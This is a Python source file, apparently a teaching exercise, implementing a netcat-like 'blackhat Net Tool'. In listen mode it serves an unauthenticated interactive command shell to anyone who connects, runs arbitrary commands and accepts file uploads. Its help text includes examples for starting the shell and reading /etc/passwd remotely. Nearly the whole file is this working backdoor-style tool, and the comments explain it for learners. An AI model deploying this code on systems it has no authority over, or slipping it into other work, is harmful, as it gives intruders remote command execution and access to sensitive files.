# Import required libraries
import argparse
import socket
import shlex
import subprocess
import sys
import textwrap
import threading

# Define execution that waits for commands from user
def execute(cmd):
    cmd = cmd.strip()
    if not cmd:
        return
    # subprocess runs the command on local host and returns its output to user    
    output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)
    return output.decode()

# Defines NetCat connection function
class NetCat:
    def __init__(self, args, buffer=None):
        # Start function with args from cmd line and creates ipv4, TCP connection socket
        self.args = args
        self.buffer = buffer
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Manipulate socket option to permit bind to reuse ports for this socket.
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    # If --listen, execute listen(), else execute send() to option
    def run(self):
        if self.args.listen:
            self.listen()
        else:
            self.send()

    # Define send function connecting to target:port and if avaible send buffer to target
    def send(self):
        self.socket.connect((self.args.target, self.args.port))
        if self.buffer:
            self.socket.send(self.buffer)

        # Start loop to receive data from target, breaks when all data tranfer has ended
        try:
            while True:
                recv_len = 1
                response = ''
                while recv_len:
                    data = self.socket.recv(4096)
                    recv_len = len(data)
                    response += data.decode()
                    if recv_len < 4096:
                        break
                # If not ended, print response data and waits for user input
                if response:
                    print(response)
                    buffer = input('> ')
                    buffer += '\n'
                    self.socket.send(buffer.encode())
        # Accepts Ctrl+C to exit script
        except KeyboardInterrupt:
            print('User terminated.')
            self.socket.close()
            sys.exit()

    # Defines listen function
    def listen(self):
        # Binds to the target:port and starts listening in loop
        self.socket.bind((self.args.target, self.args.port))
        self.socket.listen(5)
        # Pass connected socket to handle function
        while True:
            client_socket, _ = self.socket.accept()
            client_thread = threading.Thread(target=self.handle, args=(client_socket,))
            client_thread.start()

    # Defines handle function that passes the users argument entry to execute function and return output to socket
    def handle(self, client_socket):
        if self.args.execute:
            output = execute(self.args.execute)
            client_socket.send(output.encode())
        # Enters a listening loop for data coming and write accumulated content to file
        elif self.args.upload:
            file_buffer = b''
            while True:
                data = client_socket.recv(4096)
                if data:
                    file_buffer += data
                else:
                    break
            
            with open(self.args.upload, 'wb') as f:
                f.write(file_buffer)
            message = f'Saved file {self.args.upload}'
            client_socket.send(message.encode())
        # Send a prompt to user and waits for command string, then passes command using execute function
        elif self.args.command:
            cmd_buffer = b''
            while True:
                try:
                    client_socket.send(b'::>')
                    while '\n' not in cmd_buffer.decode():
                        cmd_buffer += client_socket.recv(64)
                    response = execute(cmd_buffer.decode())
                    if response:
                        client_socket.send(response.encode())
                    cmd_buffer = b''
                except Exception as e:
                    print(f'server killed {e}')
                    self.socket.close()
                    sys.exit()

# Defines main function with parser that holds the command line interface
if __name__ == '__main__':
    # --help shows the user a list of options and description of commands
    parser = argparse.ArgumentParser( description='blackhat Net Tool', formatter_class=argparse.RawDescriptionHelpFormatter, epilog=textwrap.dedent(
        '''
        Example:
        netcat.py -t 192.168.1.108 -p 5555 -l -c                   # starts command shell
        netcat.py -t 192.168.1.108 -p 5555 -l -u=mytest.txt        # upload to file
        netcat.py -t 192.168.1.108 -p 5555 -l -e=\"cat /etc/passwd\" # execute command
        echo 'ABC' | ./netcat.py -t 192.168.1.108 -p 135           # echo text to server port 135
        netcat.py -t 192.168.1.108 -p 5555                         # connect to server
        '''
    ))
    # Define and set argument actions and description
    parser.add_argument('-c', '--command', action='store_true', help='command shell')
    parser.add_argument('-e', '--execute', help='execute specified command')
    parser.add_argument('-l', '--listen', action='store_true', help='listen')
    parser.add_argument('-p', '--port', type=int, default=5555, help='specified port')
    parser.add_argument('-t', '--target', default='192.168.0.1', help='specified IP')
    parser.add_argument('-u', '--upload', help='upload file')
    args = parser.parse_args()
    # If --listen is inserted as argument, starts NetCat object with an empty buffer string otherwise send stdin buffer content
    if  args.listen:
        buffer = ''
    else:
        buffer = sys.stdin.read()
    # Set netcat run
    nc = NetCat(args, buffer.encode())
    nc.run()

